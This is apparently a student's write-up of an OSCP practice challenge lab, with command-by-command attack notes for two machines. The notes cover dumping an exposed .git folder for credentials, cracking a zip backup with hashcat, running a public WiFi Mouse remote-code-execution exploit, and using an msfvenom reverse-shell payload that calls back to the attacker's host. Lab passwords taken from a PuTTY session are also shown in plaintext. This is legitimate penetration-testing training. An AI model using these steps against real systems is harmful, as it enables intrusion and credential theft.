# Questions 
This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP exam.

The challenge contains three machines that are connected via Active Directory, and three standalone machines that do not have any dependencies or intranet connections. All the standalone machines have a local.txt and a proof.txt, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together, and the entire domain must be compromised to achieve any points for it at all.

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

# 
sudo nmap -T4 -A 192.168.162.141-145
[ip-scanning.md]

# CRYSTAL
# Found there is a .git on the server. Lets download and find what can we find from the server
wget -r -np http://192.168.162.144/.git/

git show
...
diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
...

git log
# Found there is alot changes, 
git show 80ad...
...
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "dean@challenge.pwk";
+    private $password = "BreakingBad92";
...
# Since we have both two credentials now lets try to access into the server
# Only 1 user manage to access it
ssh stuart@192.168.162.144 
cat local.txt

# In the opt/backup found sitebackup1.zip file
# Lets download to our local use scp
scp sitebackup*.zip kali@192.168.45.165:/home/kali/Desktop/OSCP-A

# For the sitebackup3.zip is encrypted, the rest is broken
# Lets extract the password and brute force it
zip2john sitebackup3.zip > sitebackup3.hash
hashcat --help | grep -i "zip"
  13600 | WinZip      | Archive
# References https://www.reddit.com/r/computerforensics/comments/9rezdi/help_cracking_zip_hash/?rdt=50409
code sitebackup3.hash
code zip.hash
hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt
...
codeblue                                             
Session..........: hashcat
Status...........: Cracked
...

[configuration.php]
	public $dbtype = 'mysql';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'Password@1';
	public $db = 'jooml';
	public $dbprefix = 'o83rl_';
    public $secret = 'Ee24zIK4cDhJHL4H';
	public $mailfrom = 'chloe@challenge.lab';
	public $fromname = 'Challenge Lab';
	public $sendmail = '/usr/sbin/sendmail';

# Receive the DB user joomla and chloe, lets try to su chloe
chloe@oscp:/opt/backup$ sudo -l
User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
# Now we got the root user
root@oscp:~# cat proof.txt

# HERMES
snmpwalk -c public -v1 192.168.162.145 
...
iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "Mouse Server version 1.7.8.5"
...

# Found the server is actually using Mouse Server version 1.7.8.5
searchsploit mouse
...
WiFi Mouse 1.7.8.5 - Remote Code Execution                                        | windows/remote/49601.py
WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                    | windows/remote/50972.py
...
searchsplot -m 50972 

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe

python3 50972.py 192.168.162.145 192.168.45.165 met.exe
# Lel seem like not working.. Lets change to 49601
python3 -m http.server 80 # on the payload folder 
python2 50972.py 192.168.162.145 192.168.45.165 reverse.exe
# In the end I found out is the http server need to be host...
[*] Command shell session 1 opened (192.168.45.165:8888 -> 192.168.162.145:52032) at 2024-06-02 23:52:01 +0800

C:\Users\offsec\Desktop>type local.txt
# Upload winpeas and run
...
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 2004 (19041)
 [*] Enumerating installed KBs...
 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/     
  C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  Interesting files and registry 
  Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
...
# Now we owned the zachary passwords, lets try rdp
# From other writeups, we can use powershell to query
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.162.145 /cert-ignore
# Run powershell as Admin
PS C:\Users\Administrator\Desktop> type proof.txt
